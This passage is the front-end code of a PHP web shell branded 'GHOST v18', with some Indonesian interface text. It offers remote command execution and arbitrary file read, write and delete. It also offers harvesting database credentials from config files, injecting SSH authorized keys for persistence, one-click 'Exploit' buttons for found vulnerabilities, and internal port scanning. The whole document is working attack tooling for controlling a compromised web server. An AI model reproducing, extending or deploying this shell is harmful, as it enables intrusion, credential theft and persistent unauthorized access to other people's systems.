    :root { --bg:#0a0a0a; --fg:#0f0; --dim:#050; --red:#f00; --border:#222; }
    * { box-sizing: border-box; }
    body { background:var(--bg); color:var(--fg); font-family: ui-monospace, monospace; font-size:13px; padding:16px; margin:0; line-height:1.5; }
    h2 { font-size:14px; margin:0 0 8px; color:#fff; text-transform:uppercase; letter-spacing:1px; border-bottom:1px solid var(--border); padding-bottom:4px; }
    .box { border:1px solid var(--border); padding:12px; margin-bottom:12px; background:#0d0d0d; }
    .row { display:flex; gap:8px; flex-wrap:wrap; align-items:center; }
    input, button, select { background:#000; color:var(--fg); border:1px solid var(--border); padding:6px 8px; font-family:inherit; font-size:13px; border-radius:2px; }
    button { cursor:pointer; font-weight:bold; }
    button:hover { background:var(--fg); color:#000; }
    pre { background:#000; padding:10px; border:1px solid var(--border); margin:0; overflow:auto; white-space:pre-wrap; word-break:break-all; max-height:300px; font-size:12px; }
    .dim { color:#060; }
    .err { color:var(--red); }
    .out { color:var(--fg); }
    .grid { display:grid; grid-template-columns: 1fr 1fr; gap:8px; }
    .tag { display:inline-block; padding:2px 6px; border-radius:2px; background:#111; border:1px solid #333; font-size:11px; margin-right:4px; }
    .tag-ok { background:#030; border-color:#060; color:#6f6; }
    .tag-no { background:#300; border-color:#600; color:#f66; }
    #term { height:25vh; overflow:auto; border:1px solid var(--border); background:#000; padding:8px; }
    .term-line { display:flex; }
    .term-in { color:#888; margin-right:8px; }
    .term-out { white-space:pre-wrap; word-break:break-all; }
    table { width:100%; border-collapse:collapse; margin-top:8px; font-size:12px; }
    th,td { border:1px solid #333; padding:6px; text-align:left; }
    th { background:#111; color:#fff; }
    .badge { background:#500; color:#f00; padding:2px 5px; border-radius:3px; font-size:10px; font-weight:bold; }
    
    /* TABS */
    .tabs { display:flex; gap:4px; margin-bottom:12px; border-bottom:1px solid var(--border); padding-bottom:8px; }
    .tab-btn { background:transparent; border:1px solid transparent; color:#888; padding:8px 16px; cursor:pointer; }
    .tab-btn:hover { color:#fff; }
    .tab-btn.active { background:#111; border-color:var(--border); border-bottom-color:var(--bg); color:var(--fg); border-radius:4px 4px 0 0; }
    .tab-content { display:none; }
    .tab-content.active { display:block; }
</style>
</head>
<body>
<div class="box">
    <h2>GHOST v18 / Final Build</h2>
    <div class="row">
        <span class="tag"><?= htmlspecialchars($env['php_version']) ?></span>
        <span class="tag"><?= htmlspecialchars($env['user']) ?></span>
        <span class="tag <?= $env['can']['exec']?'tag-ok':'tag-no' ?>">exec: <?= $env['can']['exec']?:'BLOCKED' ?></span>
    </div>
</div>

<div class="tabs">
    <button class="tab-btn active" id="btn-tab-term" onclick="switchTab('tab-term', this)">Terminal</button>
    <button class="tab-btn" id="btn-tab-scan" onclick="switchTab('tab-scan', this)">Deep Scanner</button>
    <button class="tab-btn" id="btn-tab-vuln" onclick="switchTab('tab-vuln', this)">Vulnerability</button>
    <button class="tab-btn" id="btn-tab-db-ssh" onclick="switchTab('tab-db-ssh', this)">DB & SSH</button>
    <button class="tab-btn" id="btn-tab-profile" onclick="switchTab('tab-profile', this)">Profile & Port</button>
</div>

<!-- TAB: TERMINAL -->
<div id="tab-term" class="tab-content active">
    <div class="box">
        <div id="term"><div class="term-line"><span class="dim">Welcome.</span></div></div>
        <div class="row" style="margin-top:8px;">
            <input type="text" id="cmd" placeholder="whoami" style="flex:1;">
            <button id="btn-exec">Exec</button>
        </div>
    </div>
    <div class="box">
        <h2>File Manager</h2>
        <div class="row">
            <input type="text" id="f-path" placeholder="/path/to/file" style="flex:1;">
            <button id="btn-read">Read</button>
            <button id="btn-write" style="border-color:#ff0;color:#ff0;">Write</button>
        </div>
        <pre id="f-out" style="margin-top:8px;">Ready.</pre>
    </div>
</div>

<!-- TAB: DEEP SCANNER -->
<div id="tab-scan" class="tab-content">
    <div class="box">
        <h2>Heuristic File Scanner</h2>
        <div class="row">
            <button id="btn-scan">Start Scan</button>
            <span id="scan-status" class="dim">Idle.</span>
        </div>
        <div id="scan-results"></div>
    </div>
</div>

<!-- TAB: VULNERABILITY -->
<div id="tab-vuln" class="tab-content">
    <div class="box">
        <h2>Vulnerability Explorer</h2>
        <div class="row"><button id="btn-vuln">Scan Vulnerabilities</button></div>
        <div id="vuln-results"></div>
    </div>
</div>

<!-- TAB: DB & SSH -->
<div id="tab-db-ssh" class="tab-content">
    <div class="grid">
        <div class="box">
            <h2>DB Harvester</h2>
            <div class="row"><button id="btn-db">Scan & Connect</button></div>
            <pre id="db-out" style="margin-top:8px;">Ready.</pre>
        </div>
        <div class="box">
            <h2>SSH Manager</h2>
            <div class="row"><button id="btn-ssh">Scan SSH</button></div>
            <pre id="ssh-out" style="margin-top:8px;">Ready.</pre>
            <div class="row" style="margin-top:8px;">
                <input type="text" id="ssh-key" placeholder="ssh-rsa AAAA..." style="flex:1;">
                <button id="btn-ssh-inject">Inject</button>
                <button id="btn-ssh-clean" style="border-color:#f00;color:#f00;">Clean</button>
            </div>
        </div>
    </div>
</div>

<!-- TAB: PROFILE & PORT -->
<div id="tab-profile" class="tab-content">
    <div class="grid">
        <div class="box">
            <h2>Target Profiler & CVE</h2>
            <div class="row"><button id="btn-cve">Analyze Stack & CVE</button></div>
            <div id="cve-out" style="margin-top:8px;">Ready.</div>
        </div>
        <div class="box">
            <h2>Internal Port Scanner</h2>
            <div class="row">
                <input type="text" id="port-target" value="127.0.0.1" style="flex:1;">
                <button id="btn-port">Scan Ports</button>
            </div>
            <pre id="port-out" style="margin-top:8px;">Ready.</pre>
        </div>
    </div>
</div>

<script>
document.addEventListener('DOMContentLoaded', () => {
    document.getElementById('btn-exec').onclick = execCmd;
    document.getElementById('cmd').onkeydown = e => { if(e.key==='Enter') execCmd(); };
    document.getElementById('btn-read').onclick = readFile;
    document.getElementById('btn-write').onclick = writeFile;
    document.getElementById('btn-scan').onclick = startScan;
    document.getElementById('btn-vuln').onclick = vulnScan;
    document.getElementById('btn-db').onclick = dbHarvest;
    document.getElementById('btn-ssh').onclick = sshScan;
    document.getElementById('btn-ssh-inject').onclick = () => sshAct('inject');
    document.getElementById('btn-ssh-clean').onclick = () => sshAct('clean');
    document.getElementById('btn-cve').onclick = cveProfile;
    document.getElementById('btn-port').onclick = portScan;
});

function switchTab(id, btn) {
    document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
    document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
    document.getElementById(id).classList.add('active');
    btn.classList.add('active');
}

function esc(s){ 
    if(s === null || s === undefined) return '';
    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); 
}

async function api(act, data={}) {
    const body = new URLSearchParams(); body.append('act', act);
    for (let k in data) body.append(k, data[k]);
    const r = await fetch(window.location.href, { method:'POST', body });
    const text = await r.text();
    try { 
        return JSON.parse(text); 
    } catch(e) { 
        return {err:'RAW ERROR ('+r.status+'):\n'+text.substring(0,500)}; 
    }
}

async function execCmd() {
    const cmd = document.getElementById('cmd').value.trim(); if(!cmd) return;
    document.getElementById('cmd').value = '';
    const t = document.getElementById('term');
    const line = document.createElement('div'); line.className = 'term-line';
    line.innerHTML = `<span class="term-in">$</span><span class="term-out">${esc(cmd)}</span>`;
    t.appendChild(line); t.scrollTop = t.scrollHeight;
    const resp = await api('exec', {cmd});
    const outLine = document.createElement('div'); outLine.className = 'term-line';
    if(resp.err) outLine.innerHTML = `<span class="err">[${esc(resp.tier||'ERR')}] Error: ${esc(resp.err)}</span>`;
    else outLine.innerHTML = `<span class="dim">[${esc(resp.tier)}]</span><span class="term-out">${esc(resp.out||'(no output)')}</span>`;
    t.appendChild(outLine); t.scrollTop = t.scrollHeight;
}

async function readFile() {
    const p = document.getElementById('f-path').value.trim(); const o = document.getElementById('f-out');
    if(!p) return o.innerText = 'Path?'; o.innerText = 'Reading...';
    const resp = await api('read', {path:p});
    o.innerText = resp.err ? 'Error: '+resp.err : (resp.content || '(empty)');
}
async function writeFile() {
    const p = document.getElementById('f-path').value.trim(); if(!p) return alert('Path?');
    const data = prompt('Isi konten:'); if(data === null) return;
    const o = document.getElementById('f-out'); o.innerText = 'Writing...';
    const resp = await api('write', {path:p, data:data});
    o.innerText = resp.ok ? 'Success.' : 'Error.';
}

async function startScan() {
    let offset = 0; let mal = [];
    const resDiv = document.getElementById('scan-results'); resDiv.innerHTML = '';
    const statDiv = document.getElementById('scan-status'); statDiv.innerText = 'Scanning...';
    while (true) {
        statDiv.innerText = `Analyzing batch offset ${offset}...`;
        const d = await api('scan', {offset: offset});
        if (d.err) { statDiv.innerText = 'Error: ' + d.err; break; }
        d.files.forEach(f => mal.push(f));
        if (d.done) { statDiv.innerText = `Done! ${mal.length} files flagged from ${d.total}.`; renderScan(mal); break; }
        offset += 50;
    }
}
function renderScan(mal) {
    if (!mal.length) { document.getElementById('scan-results').innerHTML = '<p class="dim">Clean.</p>'; return; }
    let h = `<table><tr><th>Type & Desc</th><th>File</th><th>Aksi</th></tr>`;
    mal.forEach(x => {
        let enc = encodeURIComponent(x.path);
        let badge_color = x.type.includes('Suspicious') ? '#f0ad4e' : '#d9534f';
        h += `<tr>
            <td><span class="badge" style="background:${badge_color}">${esc(x.type)}</span><br><span class="dim" style="font-size:11px;">${esc(x.desc)}</span></td>
            <td>${esc(x.path)}</td>
            <td>
                <button onclick="viewFileScan('${enc}')" style="border-color:#0f0;color:#0f0; padding:2px 5px; font-size:11px;">View</button>
                <button onclick="delFileScan('${enc}')" style="border-color:#f00;color:#f00; padding:2px 5px; font-size:11px;">Del</button>
            </td>
        </tr>`;
    });
    h += `</table>`; document.getElementById('scan-results').innerHTML = h;
}

function viewFileScan(enc) {
    const p = decodeURIComponent(enc);
    document.getElementById('f-path').value = p;
    switchTab('tab-term', document.getElementById('btn-tab-term'));
    readFile();
}

async function delFileScan(enc) {
    const p = decodeURIComponent(enc);
    if(!confirm('Hapus file ' + p + '?')) return;
    await api('delete', {path:p});
    startScan(); // refresh
}

async function dbHarvest() {
    const o = document.getElementById('db-out'); o.innerText = 'Scanning configs...';
    const d = await api('db_harvest');
    if (d.err) return o.innerText = d.err;
    o.innerText = d.logs.join('\n');
}
async function sshScan() {
    const o = document.getElementById('ssh-out'); o.innerText = 'Scanning...';
    const d = await api('ssh_scan');
    if (d.err) return o.innerText = d.err;
    let txt = d.logs.join('\n') + '\n\n';
    if (d.keys.length) {
        txt += '--- AUTHORIZED KEYS ---\n';
        d.keys.forEach(k => txt += `[${k.type}] ${k.comment}\n${k.raw}\n\n`);
    } else { txt += 'Tidak ada key ditemukan.'; }
    o.innerText = txt;
}
async function sshAct(act) {
    const k = document.getElementById('ssh-key').value;
    if(!k) return alert('Isi key dulu!');
    const d = await api('ssh_action', {action: act, key: k});
    alert(d.msg || d.err);
}

async function vulnScan() {
    const resDiv = document.getElementById('vuln-results'); resDiv.innerHTML = 'Scanning...';
    const d = await api('vuln_scan');
    if (d.err) { resDiv.innerHTML = '<span class="err">'+d.err+'</span>'; return; }
    if (!d.length) { resDiv.innerHTML = '<p class="dim">No vulnerabilities found.</p>'; return; }
    let h = `<table><tr><th>Type</th><th>Path</th><th>Desc</th><th>Aksi</th></tr>`;
    d.forEach(v => {
        h += `<tr><td><span class="badge">${esc(v.type)}</span></td><td>${esc(v.path)}</td><td>${esc(v.desc)}</td>
              <td><button onclick="exploit('${esc(v.type)}', '${encodeURIComponent(v.path)}')" style="border-color:#f00;color:#f00;">Exploit</button></td></tr>`;
    });
    h += `</table>`; resDiv.innerHTML = h;
}
async function exploit(t, encP) {
    if(!confirm('Jalankan exploit untuk celah ini?')) return;
    const p = decodeURIComponent(encP);
    const d = await api('exploit', {type: t, path: p});
    alert(d.msg || d.err);
}

async function portScan() {
    const t = document.getElementById('port-target').value.trim(); const o = document.getElementById('port-out');
    o.innerText = 'Scanning ports on ' + t + ' via Bash/Exec...';
    const d = await api('port_scan', {target: t});
    if (d.err) return o.innerText = d.err;
    if (!d.length) return o.innerText = 'No open ports found.';
    let txt = '--- OPEN PORTS ---\n';
    d.forEach(p => txt += `[+] ${p.port}/tcp\n`);
    o.innerText = txt;
}
async function cveProfile() {
    const o = document.getElementById('cve-out'); o.innerText = 'Analyzing...';
    const d = await api('cve_profile');
    if (d.err) return o.innerText = d.err;
    let txt = '<h3>Stack:</h3><ul>';
    d.stack.forEach(s => txt += `<li>${esc(s)}</li>`);
    txt += '</ul><h3>CVE:</h3>';
    if (d.cves.length) {
        txt += '<ul style="color:#f00;">';
        d.cves.forEach(c => txt += `<li>${esc(c)}</li>`);
        txt += '</ul>';
    } else { txt += '<p class="dim">Tidak ada CVE kritis yang cocok.</p>'; }
    o.innerHTML = txt;
}
</script>
</body>
</html>
    <?php
}
if (!defined('GH_ENTRY_DONE')) { define('GH_ENTRY_DONE', true); gh_router(); }
